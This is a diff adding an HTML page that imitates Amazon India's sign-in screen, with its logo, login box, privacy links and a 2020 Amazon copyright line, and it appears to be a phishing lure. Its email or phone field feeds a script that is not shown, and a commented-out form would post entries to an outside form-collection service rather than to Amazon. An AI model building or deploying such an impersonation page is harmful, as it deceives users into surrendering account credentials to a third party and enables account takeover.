@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign In</title>
+    <link rel="stylesheet" type="text/css" href="./stylesheet/style.css">
+    <script src='https://kit.fontawesome.com/a076d05399.js'></script>
+    <script src="./scripts/main_scripts.js"></script>
+</head>
+<body>
+    <div id="amzinlogocontainer" width="100%">
+        <img id="amzinlogo" src="./image_sources/main_logo.jpg" alt="" srcset="">
+    </div>
+    <div id="loginboxcontainer">
+        <div id="loginbox">
+            <div id="loginelements">
+                <!-- <p><span id="login">Login</span></p> -->
+                <span id="login">Login</span>
+                <!-- <form action="https://formspree.io/mgennvqo" method="post"></form> -->
+                    <p>
+                        <label for="ap_email" id="emailorno">Email or mobile phone number</label>
+                        <input type="text" name="emailorno" id="inputfield">
+                        <span id="warning" style="font-size: 12px; color: red; display: none;">
+                            <i class='fas fa-exclamation'></i>
+                            Enter your email or mobile phone number
+                        </span>
+                    </p>
+                    <p>
+                        <input type="submit" value="Continue" id="continueButton1" onclick="saveemailorno()">
+                    </p>
+                <!-- </form> -->
+                <p id="tandcwarning">By continuing, you agree to Amazon's <a class="textlinks" href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&nodeId=200534380">Privacy Notice.</a></p>
+                <p style="padding-bottom: 0; margin-bottom: 0;">
+                    <a class="textlinks" href="javascript:void(0)">
+                        <i class='fas' id="right-expand">&#xf0da; </i>
+                        <span style="font-size:13px;">Need help? </span>
+                    </a>
+                </p>
+            </div>
+        </div>
+    </div>
+    <div id="extras">
+        <div id="divblockcontainer">
+            <h5 id="division-block"><span style="background-color: white;">&nbsp;&nbsp;&nbsp;New to Amazon?&nbsp;&nbsp;&nbsp;</span></h5>
+        </div>
+        <div id="signupcontainer">
+            <button id="signup" onclick="navtosignup()">Create your Amazon account</button>
+        </div>
+    </div>
+    <div id="footer">
+        <div style="height: 25px;"></div>
+        <div class="extralinks">
+            <p>
+                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=200545940" class="textlinks">Conditions of use</a>
+                &emsp;&emsp;
+                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=200534380" class="textlinks">Privacy Notice</a>
+                &emsp;&emsp;
+                <a href="https://www.amazon.in/help" class="textlinks">Help</a>
+            </p>
+        </div>
+        <div class="sign">
+            <p style="font-size: 11px!important; color: #555;">
+                © 1996-2020, Amazon.com, Inc. or its affiliates
+            </p>
+        </div>
+    </div>
+
+    <script src="./scripts/main_scripts.js"></script>
+</body>
+</html>
